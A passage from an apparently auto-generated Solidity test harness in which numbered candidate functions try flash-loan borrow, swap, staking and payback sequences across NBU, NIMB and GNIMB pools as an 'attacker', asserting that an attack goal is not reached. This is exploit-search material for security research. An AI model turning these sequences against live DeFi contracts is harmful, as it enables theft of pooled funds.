        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
